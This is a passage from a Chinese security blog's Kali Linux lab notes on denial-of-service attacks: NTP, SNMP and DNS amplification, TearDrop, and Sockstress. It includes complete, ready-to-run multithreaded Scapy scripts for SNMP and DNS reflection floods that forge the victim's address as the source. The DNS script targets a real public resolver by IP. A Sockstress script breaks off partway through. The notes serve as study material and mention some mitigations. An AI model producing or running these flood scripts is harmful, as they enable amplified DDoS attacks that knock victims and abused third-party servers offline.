      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%BA%94)%EF%BC%9ADoS--NTP%E6%94%BE%E5%A4%A7/" itemprop="url">Kali Linux笔记(八十五)：DoS--NTP放大</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-10T22:47:15+08:00">
                2020-02-10
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  365 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-NTP放大攻击"><a href="#1-NTP放大攻击" class="headerlink" title="1. NTP放大攻击"></a>1. NTP放大攻击</h4><ul>
<li>网络时间协议<ul>
<li>Network Time Protocol </li>
<li>保证网络设备时间同步</li>
<li>电子设备互相干扰导致时钟差异越来越大</li>
<li>服务端口UDP 123</li>
<li>▲ SSL证书的时间戳</li>
<li>▲ 影响应用正常运行、日志审计不可信</li>
</ul>
</li>
<li>攻击原理<ul>
<li>NTP服务提monlist（MON_GETLIST）查询功能<ul>
<li>监控NTP服务器的状态</li>
</ul>
</li>
<li>客户端查询时，NTP服务器返回最后同步时间的600个客户端IP<ul>
<li>每6个IP一个数据包，最多100个数据包（放大约100倍）</li>
</ul>
</li>
<li>放大效果看monlist的地址列表</li>
</ul>
</li>
<li>攻击对策<ul>
<li>升级到ntpd 4.2.7p26及以上的版本（默认关闭monlist查询）</li>
<li>收到关闭monlist查询功能</li>
</ul>
</li>
</ul>
<h4 id="2-实验"><a href="#2-实验" class="headerlink" title="2. 实验"></a>2. 实验</h4><ul>
<li>Bodhi（被攻击者）<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li><strong><code>🔺命令：sudo apt-get install ntp</code></strong></li>
<li><strong><code>🔺命令：netstat -pantu | grep 123</code></strong>（查看ntp服务是否开启）</li>
</ul>
</li>
<li>Kali（攻击者）<ul>
<li>发现NTP服务：<strong><code>🔺命令：nmap -sU -p123 Bodhi的IP</code></strong></li>
<li>发现漏洞<ul>
<li><strong><code>🔺命令：ntpdc -n -c monlist Bodhi的IP</code></strong>（timeout）</li>
</ul>
</li>
</ul>
</li>
<li>Bodhi（被攻击者）<ul>
<li><strong><code>🔺命令：vi /etc/ntp.conf</code></strong> <ul>
<li>#restrict -4 default kod nomodify notrap nopeer noquery </li>
<li>#restrict -6 default kod nomodify notrap nopeer noquery</li>
</ul>
</li>
<li><strong><code>🔺命令：service ntp stop/start</code></strong></li>
</ul>
</li>
<li>Kali（攻击者）<ul>
<li><strong><code>🔺命令：ntpdc -n -c monlist Bodhi的IP</code></strong>（可查询到monlist地址表）</li>
<li><strong><code>🔺命令：ntpq -c rv Bodhi的IP</code></strong>（查询Bodhi的系统信息）</li>
<li><strong><code>🔺命令：ntpdc -c sysinfo Bodhi的IP</code></strong>（查询Bodhi的sysinfo）</li>
<li>▲ 2020.2.10 无法查到monlist地址表，但能查到Bodhi得系统信息</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E5%9B%9B)%EF%BC%9ADoS--SNMP%E6%94%BE%E5%A4%A7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E5%9B%9B)%EF%BC%9ADoS--SNMP%E6%94%BE%E5%A4%A7/" itemprop="url">Kali Linux笔记(八十四)：DoS--SNMP放大</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-10T21:19:01+08:00">
                2020-02-10
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  660 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  3 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-SNMP放大攻击"><a href="#1-SNMP放大攻击" class="headerlink" title="1. SNMP放大攻击"></a>1. SNMP放大攻击</h4><ul>
<li>简单网络管理协议（▲ 实际中主要运用为网络设备的监视）<ul>
<li>Simple Network Management Protocol</li>
<li>服务端口UDP 161/162</li>
<li>▲ 主动监控 → 被管理设备161端口，被动监控 → 管理设备162端口</li>
<li>管理站（manager/客户端）、被管理设备（agent/服务端）</li>
<li>管理信息数据库（MIB）是一个信息存储库，包含管理代理中的有关配置和性能的数据，按照不同分类，包含分属不同组的多个数据对象</li>
<li>每一个节点都有一个对象标识符（OID）来唯一的标识</li>
<li>IETF定义标准的MIB库/厂家自定义MIB库</li>
</ul>
</li>
<li>攻击原理<ul>
<li>请求流量小，查询结果返回流量大</li>
<li>结合伪造源地址实现攻击</li>
</ul>
</li>
</ul>
<h4 id="2-Scapy构造攻击数据包"><a href="#2-Scapy构造攻击数据包" class="headerlink" title="2. Scapy构造攻击数据包"></a>2. Scapy构造攻击数据包</h4><ul>
<li>Window Server 2003<ul>
<li>安装SNMP服务器（Win+R → appwiz.cpl → 更改或添加程序 → 管理和监控工具 → 简单网络管理协议SNMP，可能需要光盘）<ul>
<li>Win+R → services.msc → SNMP Service → 代理 → 服务全选</li>
<li>Win+R → services.msc → SNMP Service → 安全 → 团体（Community）</li>
<li>添加 → 团队权限（只读）、团队名称（asd）</li>
<li>接受来自任何主机的SNMP数据包</li>
</ul>
</li>
<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址，网卡模式为Bridge方式</li>
</ul>
</li>
<li>Kali<ul>
<li>IP头构造<ul>
<li>i=IP()</li>
<li>i.dst=”Window Server 2003的IP地址”</li>
<li>i.display()</li>
</ul>
</li>
<li>UDP头构造<ul>
<li>u=udp()</li>
<li>u.dport=161</li>
<li>u.sport=161</li>
<li>u.display()</li>
</ul>
</li>
<li>SNMP头构造<ul>
<li>s=SNMP()</li>
<li>s.community=”asd”</li>
<li>s.display()</li>
</ul>
</li>
<li>SNMP内容构造<ul>
<li>b=SNMPbulk() </li>
<li>b.display() </li>
<li>b.max_repetitions=100（修改此数可增大回包数据大小）</li>
<li>b.varbindlist=[SNMPvarbind(oid=ASN1_OID(‘1.3.6.1.2.1.1’)),SNMPvarbind(oid=ASN1_OID(‘1.3.6.1.2.1.19.1.3’))] </li>
</ul>
</li>
<li>拼接数据<ul>
<li>s.PDU=b </li>
<li>s.display()</li>
</ul>
</li>
<li>发送数据包<ul>
<li>r= (i/u/s)</li>
<li>r.display()</li>
<li>Sr1(r)</li>
</ul>
</li>
<li>▲ Kali开启Wireshark抓包，监听Kali的IP地址，查看返回的数据包的大小（出现分段数据包）</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#_*_ coding:utf-8 _*_</span><br><span class="line"></span><br><span class="line">from scapy.all import *</span><br><span class="line">from time import sleep</span><br><span class="line">import thread</span><br><span class="line">import random</span><br><span class="line">import logging</span><br><span class="line">logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line"></span><br><span class="line">if len(sys.argv) != 6:</span><br><span class="line">    print &quot;用法：./dns_flood.py [利用的IP地址] [攻击的IP地址] [回包数据大小] [团体] [线程数]&quot;</span><br><span class="line">    print &quot;举例：./dns_flood.py 1.1.1.1 1.1.1.2 100 asd 20&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">target = str(sys.argv[1])</span><br><span class="line">tar = str(sys.argv[2])</span><br><span class="line">datapacket = int(sys.argv[3])</span><br><span class="line">person = str(sys.argv[4])</span><br><span class="line">threads = int(sys.argv[5])</span><br><span class="line"></span><br><span class="line">print &quot;正在执行 SNMP Flood 攻击，按 Ctrl+C 停止攻击&quot;</span><br><span class="line">def snmpflood(target,datapacket,person,tar):</span><br><span class="line">    while 0 == 0:</span><br><span class="line">        x = random.randint(0,65535)</span><br><span class="line">        send(IP(dst=target,src=tar)/UDP(sport=x,dport=161)/SNMP(community=person,PDU=SNMPbulk(max_repetitions=datapacket,varbindlist=[SNMPvarbind(oid=ASN1_OID(&apos;1.3.6.1.2.1.1&apos;)),SNMPvarbind(oid=ASN1_OID(&apos;1.3.6.1.2.1.19.1.3&apos;))])),verbose=0)</span><br><span class="line"></span><br><span class="line">for x in range(0,threads):</span><br><span class="line">    thread.start_new_thread(snmpflood,(target,datapacket,person,tar))</span><br><span class="line"></span><br><span class="line">while 0 == 0:</span><br><span class="line">    sleep(1)</span><br></pre></td></tr></table></figure>

<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=6f7eEyOilZlSnDdl_8LBdW225mV-Lmr7XWu_u-kgOVcKC1uaDnPW8Nu70JJ59mtD4QHd_sAqLzjoBBYLA_kk4IZ9D5Q_Db1xbIZ9nCjgkNSAU0mNL8o6Ljcppw&file_name=/SNMP%E6%94%BE%E5%A4%A7.PNG" alt="SNMP放大攻击"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B8%89)%EF%BC%9ADoS--DNS%E6%94%BE%E5%A4%A7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B8%89)%EF%BC%9ADoS--DNS%E6%94%BE%E5%A4%A7/" itemprop="url">Kali Linux笔记(八十三)：DoS--DNS放大</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-09T23:49:58+08:00">
                2020-02-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  488 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  2 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-DNS放大攻击"><a href="#1-DNS放大攻击" class="headerlink" title="1. DNS放大攻击"></a>1. DNS放大攻击</h4><ul>
<li>产生大流量的攻击方法<ul>
<li>单机的带宽优势</li>
<li>巨大单机数量形成的流量汇聚</li>
<li>利用协议特性实现放大效果的流量</li>
</ul>
</li>
<li>DNS协议放大效果<ul>
<li>查询请求流量小，但响应流量可能非常巨大</li>
<li><strong><code>🔺命令：dig hp.com @202.96.134.133</code></strong>（流量放大约8倍）</li>
</ul>
</li>
<li>攻击原理<ul>
<li>伪造源地址为被攻击目标地址，向递归域名查询服务器发起查询</li>
<li>DNS服务器成为流量放大和实施攻击者，大量DNS服务器实现DDoS</li>
</ul>
</li>
</ul>
<h4 id="2-Scapy构造攻击数据包"><a href="#2-Scapy构造攻击数据包" class="headerlink" title="2. Scapy构造攻击数据包"></a>2. Scapy构造攻击数据包</h4><ul>
<li>Kali开启Wireshark抓包，监听Kali的IP地址</li>
<li>IP/UDP/DNS/DNS查询内容</li>
<li>IP头构造<ul>
<li>i=IP()</li>
<li>i.dst=”202.96.134.133”</li>
<li>i.src=”被攻击者的IP”</li>
<li>i.display()</li>
</ul>
</li>
<li>UDP头构造<ul>
<li>u=udp()</li>
<li>u.display()</li>
</ul>
</li>
<li>DNS头构造<ul>
<li>d=DNS()</li>
<li>d.rd=1（递归查询）</li>
<li>d.qdount=1</li>
<li>d.display()</li>
</ul>
</li>
<li>DNS内容构造<ul>
<li>q=DNSQR()</li>
<li>q.qname=”hp.com”</li>
<li>q.qtype=255（A为默认记录，255即查所有记录）</li>
<li>q.display()</li>
</ul>
</li>
<li>拼接数据<ul>
<li>d.qd=q</li>
<li>d.display()</li>
</ul>
</li>
<li>发送数据包<ul>
<li>r=(i/u/d)</li>
<li>r.display()</li>
<li>sr1(r)</li>
<li>▲ 发包：send(r)（可用Kali进行发包，物理机进行接收数据包）</li>
</ul>
</li>
<li>▲ 结合IP地址欺骗，利用大量DNS服务器做傀儡攻击目标</li>
<li><strong><code>🔺命令：./dns_flood.py 被攻击者的IP hp.com 20</code></strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#_*_ coding:utf-8 _*_</span><br><span class="line"></span><br><span class="line">from scapy.all import *</span><br><span class="line">from time import sleep</span><br><span class="line">import thread</span><br><span class="line">import random</span><br><span class="line">import logging</span><br><span class="line">logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line"></span><br><span class="line">if len(sys.argv) != 4:</span><br><span class="line">    print &quot;用法：./dns_flood.py [IP地址] [利用的域名] [线程数]&quot;</span><br><span class="line">    print &quot;举例：./dns_flood.py 1.1.1.1 hp.com 20&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">target = str(sys.argv[1])</span><br><span class="line">dnsname = str(sys.argv[2])</span><br><span class="line">threads = int(sys.argv[3])</span><br><span class="line"></span><br><span class="line">print &quot;正在执行 DNS Flood 攻击，按 Ctrl+C 停止攻击&quot;</span><br><span class="line">def dnsflood(target,dnsname):</span><br><span class="line">    while 0 == 0:</span><br><span class="line">        x = random.randint(0,65535)</span><br><span class="line">        send(IP(dst=&quot;202.96.134.133&quot;,src=target)/UDP(sport=x,dport=53)/DNS(rd=1,qdcount=1,qd=DNSQR(qname=dnsname,qtype=255)),verbose=0)</span><br><span class="line"></span><br><span class="line">for x in range(0,threads):</span><br><span class="line">    thread.start_new_thread(dnsflood,(target,dnsname))</span><br><span class="line"></span><br><span class="line">while 0 == 0:</span><br><span class="line">    sleep(1)</span><br></pre></td></tr></table></figure>

<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=1503nDLGqXjIwmENcYCXt4Hkr5EAHJ9BLqjW16FyV1IYRnOO9gMW-0cVSvDhjyIdj_lTF19VL0yhWg7vnX-l0r-w6pYB6smOI_-nfpJc0ibm1xUZRlvb_2F6TgSdoCJn&file_name=/DNS%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB.PNG" alt="DNS放大攻击"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%BA%8C)%EF%BC%9ATearDrop/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%BA%8C)%EF%BC%9ATearDrop/" itemprop="url">Kali Linux笔记(八十二)：TearDrop</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-09T21:40:17+08:00">
                2020-02-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  189 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-TearDrop"><a href="#1-TearDrop" class="headerlink" title="1. TearDrop"></a>1. TearDrop</h4><ul>
<li>主要针对早期微软操作系统（95、98、3.X、nt）<ul>
<li>近些年有人发现对2.x版本的android系统、6.0 IOS系统攻击有效</li>
</ul>
</li>
<li>原理很有趣<ul>
<li>使用IP分段偏移值实现分段覆盖，接收端处理分段覆盖时可被拒绝服务</li>
</ul>
</li>
<li>攻击效果<ul>
<li>被攻击者蓝屏、重启、卡死</li>
</ul>
</li>
<li>IP分段偏移值的数据包，以Window10下的 <strong><code>🔺命令：ping -l 4000 192.168.0.1</code></strong></li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=5beaT96bXY67_uk8iPr3eeNUo8c-ubeqogWbcVYV0ScJt8l_7DMBRvGvSpu8wDWEVsiKNRuqex7ftpNRsHsTylKf_EIjEujiAtp4ofZ2V-U4iE5qYOi8GRmxsj3405FuRX8&file_name=/IP%E5%88%86%E6%AE%B5%E5%81%8F%E7%A7%BB%E5%80%BC.PNG" alt="IP分段偏移值"></p>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=9f1a_3-CquCwJa5Si72D1v2mG529ISUXcQ0T5PzGpYdOuECyfnIJzivtCnyhAkjEygfrStj-QOFYdFtBi6Dg3gtdtFD_ed7l0HyLCABC1hXK_TWtw2AfAPc&file_name=/TearDrop.PNG" alt="TearDrop攻击"></p>
<ul>
<li>Ping大包，比较正常分段与teardrop攻击流量的区别</li>
<li>针对早期windows系统SMB协议的攻击<ul>
<li><strong><code>🔺命令：./teardrop_smb.py</code></strong></li>
<li>针对Android、IOS系统的攻击</li>
<li><strong><code>🔺命令：./teardrop_android_ios.py</code></strong></li>
<li>攻击向量并不确定，要是具体协议分析</li>
<li>▲ 2020.2.9搜索不到两个python文件</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B8%80)%EF%BC%9ASockstress/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B8%80)%EF%BC%9ASockstress/" itemprop="url">Kali Linux笔记(八十一)：Sockstress</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-09T21:34:04+08:00">
                2020-02-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  857 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  3 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-Sockstress"><a href="#1-Sockstress" class="headerlink" title="1. Sockstress"></a>1. Sockstress</h4><ul>
<li>2008年由Jack C.Louis发现</li>
<li>针对TCP服务的拒绝服务攻击<ul>
<li>消耗被攻击目标系统资源，不消耗网络带宽自宽</li>
<li>与攻击目标建立socket连接</li>
<li>▲ 设计原理：完成三次握手，最后的ACK包window大小为0（客户端不接收数据）</li>
<li>攻击者资源消耗小（CPU、内存、带宽）</li>
<li>异步攻击，单机可拒绝服务高配资源服务器</li>
<li>Window窗口实现TCP流控</li>
</ul>
</li>
</ul>
<h4 id="2-实验准备"><a href="#2-实验准备" class="headerlink" title="2. 实验准备"></a>2. 实验准备</h4><ul>
<li>Kali（攻击者）<ul>
<li>网卡方式为NAT/Bridge方式，NAT/桥接到无线网络，检查网络</li>
</ul>
</li>
<li>Metasploit（被攻击者）<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
</ul>
</li>
</ul>
<h4 id="3-实验–Python脚本"><a href="#3-实验–Python脚本" class="headerlink" title="3. 实验–Python脚本"></a>3. 实验–Python脚本</h4><ul>
<li>Metasploit（被攻击者）<ul>
<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
<li>Kali（攻击者）<ul>
<li>python脚本：<strong><code>🔺命令：./sockstress.py Metasploit的IP 21 200</code></strong></li>
<li>▲ 2020.2.9此脚本攻击效果甚微弱</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#_*_ coding:utf-8 _*_</span><br><span class="line"></span><br><span class="line">from scapy.all import *</span><br><span class="line">from time import sleep</span><br><span class="line">import thread</span><br><span class="line">import logging</span><br><span class="line">import os</span><br><span class="line">import 